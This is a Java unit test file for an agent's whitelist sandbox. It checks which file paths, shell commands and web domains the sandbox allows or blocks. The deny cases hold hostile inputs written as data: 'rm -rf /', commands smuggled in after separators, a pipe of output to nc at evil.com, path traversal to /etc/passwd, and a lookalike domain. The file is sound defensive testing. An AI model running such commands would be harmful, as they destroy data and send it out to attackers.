package com.oryxos.tool;

import com.oryxos.core.Sandbox;
import com.oryxos.core.SandboxViolationException;
import org.junit.jupiter.api.Test;

import java.util.Set;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * SC-006: whitelist violations must be intercepted 100% — every category has
 * allow and deny cases, including smuggling attempts via shell separators and
 * path traversal.
 */
class WhitelistSandboxTest {

    private final Sandbox sandbox = new WhitelistSandbox(
            Set.of(".oryxos"),
            Set.of("git", "ls", "echo"),
            Set.of("api.github.com"));

    // ---------- path ----------

    @Test
    void pathInsideWhitelistIsAllowed() {
        assertDoesNotThrow(() -> sandbox.enforce(Sandbox.ActionType.FILE_READ, ".oryxos/memory/MEMORY.md"));
        assertDoesNotThrow(() -> sandbox.enforce(Sandbox.ActionType.FILE_WRITE, ".oryxos/output/a.txt"));
    }

    @Test
    void pathOutsideWhitelistIsBlocked() {
        assertThrows(SandboxViolationException.class,
                () -> sandbox.enforce(Sandbox.ActionType.FILE_READ, "/etc/passwd"));
        assertThrows(SandboxViolationException.class,
                () -> sandbox.enforce(Sandbox.ActionType.FILE_WRITE, "C:/Windows/system32/config"));
    }

    @Test
    void pathTraversalEscapeIsBlocked() {
        assertThrows(SandboxViolationException.class,
                () -> sandbox.enforce(Sandbox.ActionType.FILE_READ, ".oryxos/../../etc/passwd"));
    }

    // ---------- shell command ----------

    @Test
    void whitelistedCommandIsAllowed() {
        assertDoesNotThrow(() -> sandbox.enforce(Sandbox.ActionType.SHELL_COMMAND, "git status"));
        assertDoesNotThrow(() -> sandbox.enforce(Sandbox.ActionType.SHELL_COMMAND, "echo hello world"));
    }

    @Test
    void nonWhitelistedCommandIsBlocked() {
        assertThrows(SandboxViolationException.class,
                () -> sandbox.enforce(Sandbox.ActionType.SHELL_COMMAND, "rm -rf /"));
        assertThrows(SandboxViolationException.class,
                () -> sandbox.enforce(Sandbox.ActionType.SHELL_COMMAND, "curl http://example.com"));
    }

    @Test
    void commandChainingSmugglingIsBlocked() {
        // first token whitelisted, second segment smuggled after a separator
        assertThrows(SandboxViolationException.class,
                () -> sandbox.enforce(Sandbox.ActionType.SHELL_COMMAND, "git status && rm -rf /"));
        assertThrows(SandboxViolationException.class,
                () -> sandbox.enforce(Sandbox.ActionType.SHELL_COMMAND, "echo ok; del C:/x"));
        assertThrows(SandboxViolationException.class,
                () -> sandbox.enforce(Sandbox.ActionType.SHELL_COMMAND, "ls | nc evil.com 4444"));
        assertThrows(SandboxViolationException.class,
                () -> sandbox.enforce(Sandbox.ActionType.SHELL_COMMAND, "echo `rm -rf /`"));
    }

    @Test
    void emptyCommandWhitelistDeniesEverything() {
        Sandbox lockedDown = new WhitelistSandbox(Set.of(".oryxos"), Set.of(), Set.of());
        assertThrows(SandboxViolationException.class,
                () -> lockedDown.enforce(Sandbox.ActionType.SHELL_COMMAND, "echo hi"));
    }

    // ---------- http domain ----------

    @Test
    void whitelistedDomainAndSubdomainAllowed() {
        assertDoesNotThrow(() -> sandbox.enforce(Sandbox.ActionType.HTTP_REQUEST, "https://api.github.com/repos"));
        assertDoesNotThrow(() -> sandbox.enforce(Sandbox.ActionType.HTTP_REQUEST,
                "https://status.api.github.com/health"));
    }

    @Test
    void nonWhitelistedDomainIsBlocked() {
        assertThrows(SandboxViolationException.class,
                () -> sandbox.enforce(Sandbox.ActionType.HTTP_REQUEST, "http://example.com/x"));
        // lookalike suffix must NOT match a different registrable domain
        assertThrows(SandboxViolationException.class,
                () -> sandbox.enforce(Sandbox.ActionType.HTTP_REQUEST, "https://evil-api.github.com.evil.com/x"));
    }

    @Test
    void nonHttpSchemeIsBlocked() {
        assertThrows(SandboxViolationException.class,
                () -> sandbox.enforce(Sandbox.ActionType.HTTP_REQUEST, "file:///etc/passwd"));
    }

    @Test
    void wildcardDomainAllowsAll() {
        Sandbox open = new WhitelistSandbox(Set.of(".oryxos"), Set.of("echo"), Set.of("*"));
        assertDoesNotThrow(() -> open.enforce(Sandbox.ActionType.HTTP_REQUEST, "https://anything.example.org/x"));
    }

    @Test
    void violationsCarryReadableMessage() {
        try {
            sandbox.enforce(Sandbox.ActionType.FILE_READ, "/etc/passwd");
            assertTrue(false, "should have thrown");
        } catch (SandboxViolationException e) {
            assertTrue(e.getMessage().contains("/etc/passwd"));
        }
    }
}
